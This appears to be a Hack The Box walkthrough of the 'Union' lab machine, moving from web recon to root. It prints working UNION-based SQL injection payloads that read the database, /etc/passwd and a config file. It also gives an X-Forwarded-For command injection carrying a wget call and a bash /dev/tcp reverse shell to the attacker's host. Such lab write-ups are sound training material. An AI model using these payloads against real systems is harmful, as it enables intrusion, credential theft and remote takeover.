---
title: "Union Walkthrough(Hack The Box)"
date: 2025-03-16
draft: false 
description: "Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection. There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. The database contains a flag that can be used to authenticate against the machine and upon authentication the webserver runs an iptables command to enable port 22. The credentials for SSH are in the PHP Configuration file used to authenticate against MySQL. Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, they can perform command injection on the system command used by the webserver to whitelist IP Addresses."
tags: ["medium", "Linux", "Hack The Box", "hacking", "Web", "Walkthrough"]
---
## Reconnaissance & Enumeration  
- Nmap scan results 
```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```
- Interesting isn't it, we got only one port-80 open
- In the scan itslef we can see the `PHPSESSID` cookie, So, this is a PHP made website
- I eventually got bored looking at the website so fired up a subdomain scan and got no results
![Pasted image 20250113000957.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113000957.png?raw=true)
- After many unsuccessful attempts, as this is a PHP website I convinced myself to run a directory fuzzing with php extension 
```bash
ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t 60
```
- Got some interesting results
![Pasted image 20250113001145.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true)
- `firewall.php` seems interesting but on accessing the page it's throwing errors, just now I was happy
![joy-killer](https://media1.tenor.com/m/bKuF5df_YnkAAAAd/samob%C3%B3jstwo-cyanide-and-happiness.gif)
- This website has a Username check option if the username is valid or did not present in the database then It will provide a link to `challenge.php`, there we have to submit some kind of flag. This is how the website works
- This username check parameter seems to be vulnerable to SQL injection. If you have no idea about SQL Injection, I have a small post for that, first check that and then come back here.
{{< article link="/Secure-The-Throne/posts/1741343014156-sql-injection/" >}}  
- When I input this payload I got different error
```sql
'OR 1=1; -- -
```
![Pasted image 20250113001954.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113001145.png?raw=true)
- There is a firewall running on this web page so SQLMap will not work, Thus we have to do all the work manually
![too-much-of-work](https://media1.tenor.com/m/o6gmreNhiwwAAAAC/so-much-to-do-too-much-to-do.gif) 
- While I was spamming with SQLi payloads I got an Interesting response for this payload
```SQL
' UNION select user(); -- -
```
![Pasted image 20250113002241.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113002241.png?raw=true)
- To get the Info about databases, We can use this payload
```SQL
' UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- -
```
- **Output:**
```
Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
```

- We got five databases in the corresponding response but `november` seems more interesting, So lets see what's inside of it
![whats-inside](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHRzNHNkZ2hvejg0aWN1YnljYXN5dHF2OTNsdTBjMjZqOHQ3ajBmaSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/KtJJVm1owcKs0Pil78/giphy.gif)
```sql
' UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='november'; -- -
```
- **Output:**
```
Sorry, flag,players you are not eligible due to already qualifying.
```

- We got what we needed `november` database has two tables, lets go further in
```sql
' UNION select group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='november'; -- -
```
- **Output:**
```
Sorry, flag:one,players:player you are not eligible due to already qualifying.
```

- Each of the tables had only one column. For now I am going for `flag` table. Let's see...
```
' UNION select group_concat(one) from flag; -- -
```
- **Output:**
```
Sorry, <redacted> you are not eligible due to already qualifying.
```
- I Got the flag not the Hack The Box user flag but the platform flag for this box and after submission of the flag, the website firewalls lifted and port 22 is now accessible
![Pasted image 20250113003834.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113003834.png?raw=true)
- Lets confirm this by a simple nmap scan on port `22`
```
❯ nmap -p 22 -A 10.10.11.128                            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 23:42 IST
Nmap scan report for union.htb (10.10.11.128)
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)

```

- Ok now let's continue with the SQLi, first I checked for the other tables and got the users info
```sql
' UNION select group_concat(player) from players; -- -
```
- **Output:**
```
Sorry, ippsec,celesian,big0us,luska,tinyboy you are not eligible due to already qualifying.
```
## Exploitation

- This is one of the reasons why sql injection is so dangerous we can read system files using SQLi if it's misconfigured. Using the below payload I got the `/etc/passwd` file data
```sql
' UNION select load_file('/etc/passwd'); -- -
```
- **Output:**
```
Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:117:MySQL Server,,,:/nonexistent:/bin/false
uhc:x:1001:1001:,,,:/home/uhc:/bin/bash
 you are not eligible due to already qualifying.
```
- From reading the `/etc/passwd` file I identified three valid users to access the system

- We can also read the source code of this page
```sql
' UNION select load_file('/var/www/html/index.php'); -- -
```
- If you remember earlier we found `config.php` via the directory fuzzing, so let's try getting it
```sql
' UNION select load_file('/var/www/html/config.php'); -- -
```
- **Output:**
```
Sorry, <?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "<redacted>";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
 you are not eligible due to already qualifying.
```
- We got the exposed password from the website configuration. Accessed the system using SSH and got the {{< keyword >}} user flag {{< /keyword >}}
![Pasted image 20250113005214.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113005214.png?raw=true)

## Privilege Escalation
- Quickly I started enumerating and eventually looked into the `firewall.php` code and I can see the vulnerable code
```php
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
```
- This above part is vulnerable to command Injection, after a while I pictured the payload and I tested with this header payload and it worked
```bash
X-FORWARDED-FOR: 8.8.8.8; wget http://10.10.14.4:8000/Union_AllPorts.txt;
```
![Pasted image 20250113011912.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113011912.png?raw=true)
- Prepared a reverse shell payload and got the shell with this 
```bash
X-FORWARDED-FOR: 8.8.8.8; bash -c 'exec bash -i &>/dev/tcp/10.10.14.4/6001 <&1';
```
- Upgraded the shell to be more stable using a new technique that I have learnt recently
```bash
script /dev/null -c bash
```
- Then foreground the shell with `CTRL+Z`
```bash
stty raw -echo; fg
```
- In the shell type this to allign it with our terminal
```bash
reset
```
- Now the shell is upgraded
- Issued this command `sudo -l` and found that `sudo` can be run with anything
![Pasted image 20250113012401.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012401.png?raw=true)
- Now easily ran the bash with root privileges  
```
sudo /bin/bash
```
- Got the {{< keyword >}} Root flag {{< /keyword >}}
![Pasted image 20250113012505.png](https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020250113012505.png?raw=true)

{{< typeit >}} This was a short box interms of my walkthrough. Anyway, see you again nextime...... {{< /typeit >}}

![end](https://media1.tenor.com/m/ORShRT5zN1MAAAAC/we%27ll-see-you-next-time-samus-paulicelli.gif)
